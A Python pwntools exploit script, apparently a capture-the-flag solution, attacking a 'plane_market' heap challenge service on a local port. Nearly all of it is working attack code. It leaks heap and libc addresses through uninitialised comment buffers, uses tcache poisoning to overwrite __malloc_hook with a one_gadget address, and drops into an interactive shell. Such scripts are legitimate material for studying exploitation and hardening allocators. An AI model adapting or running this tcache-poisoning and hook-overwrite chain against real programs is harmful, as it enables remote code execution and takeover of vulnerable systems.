from pwn import *
import re
from pwn import remote

r = remote("0.0.0.0", 9998)

# env = {"LD_PRELOAD": "./libc.so.6"}
# r = process(["./ld-linux-x86-64.so.2", "./plane_market"], env=env)
# =>
# r = remote

def sell_exploit(size, name):
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline(str(size))
    r.recvuntil(": ")
    r.sendline(name)
    r.recvuntil(": ")
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline("Y")
    print(r.recvuntil(": "))
    r.sendline("z")
    print(r.recvuntil(">"))


def sell(size, name, cost, comm_bool=True, comment_size=1, comment=" "):
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline(str(size))
    r.recvuntil(": ")
    r.sendline(name)
    r.recvuntil(": ")
    r.sendline(str(cost))
    r.recvuntil(": ")
    if comm_bool is True:
        r.sendline("Y")
        r.recvuntil(": ")
        r.sendline(str(comment_size))
        r.sendline(comment)
    else:
        r.sendline("N")
    print(r.recvuntil(">"))


def delete(plane_id):
    r.sendline("2")
    r.recvuntil(": ")
    r.sendline(str(plane_id))
    print(r.recvuntil(">"))


def view_sales():
    r.sendline("3")
    return r.recvuntil(">")


def view_plane(plane_id):
    r.sendline("4")
    r.recvuntil(": ")
    r.sendline(str(plane_id))
    print(r.recvuntil(">"))


def change_name(plane_id, name):
    r.sendline("5")
    r.recvuntil(": ")
    r.sendline(str(plane_id))
    r.recvuntil(": ")
    r.sendline(name)
    print(r.recvuntil(">"))


def view_profile():
    r.sendline("6")
    print(r.recvuntil(">"))


# input()
# pause()
r.recvuntil(": ")
r.sendline("test")  # username
r.recvuntil(">")

# write until tcache bins for a small bin size are full
for _ in range(8):
    sell(0x100, "dummy", 1, comm_bool=False)

for i in range(7, -1, -1):
    delete(i)

# there should now be an unsorted bin with libc address
# pause()

# create tcache bin to get heap address
sell(0x10, "dummy", 1, comm_bool=True, comment_size=0x10, comment="dummy")
sell(0x10, "dummy", 1, comm_bool=True, comment_size=0x10, comment="dummy")
delete(0)
delete(1)
# pause()

# write nothing during read to keep heap address
sell_exploit(0x10, "leak")

# heap address is printed out
heap_leak = view_sales().decode("ISO-8859-1")


heap_leak = re.search("Comment: (.*?)\\n", heap_leak).groups()[0]
heap_leak = u64(heap_leak.ljust(8, "\x00"))

print(hex(heap_leak))
# pause()

# write heap address of small bin chunk to freed tcache chunk
sell(0x10, "dummy", 1, comm_bool=False)
change_name(1, "ready")
delete(1)

# pause()

# chunk with libc pointer is located at offset 0x60
libc_chunk = heap_leak + 0x60

# tcache bin now has chunk with libc address
change_name(1, p64(libc_chunk))

# pause()

# allocate plane where comment is libc address to leak
sell_exploit(0x10, "libc")

libc_leak = view_sales().decode("ISO-8859-1")
libc_leak = re.search("Comment: .*Comment: (.*?)\n", libc_leak, re.DOTALL).groups()[0]
libc_leak = u64(libc_leak.ljust(8, "\x00"))
print(libc_leak)

# pause()

# main_arena_offset_96 = 0x3ebc40 + 96
main_arena_offset_96 = 0x1B9C40 + 96

libc_start = libc_leak - main_arena_offset_96

input()

libc = ELF("./libc.so.6")
malloc_hook = libc.symbols["__malloc_hook"]

malloc_hook_addr = libc_start + malloc_hook

# one_gadget_addr = libc_start + 0x4f322
one_gadget_addr = libc_start + 0xE664B

# write malloc hook address as next pointer for tcache chunk
sell(0x100, "dummy", 1, comm_bool=False)
change_name(2, "ready")
delete(2)
change_name(2, p64(malloc_hook_addr))

sell(0x100, "trash", 1, comm_bool=False)
view_profile()
view_profile()
view_profile()
sell(0x100, p64(one_gadget_addr), 1, comm_bool=False)

print("what happened?")
print(hex(malloc_hook_addr))

input()
r.interactive()
# malloc_hook triggered, we get shell
sell(0x100, "win", 1, comm_bool=False)
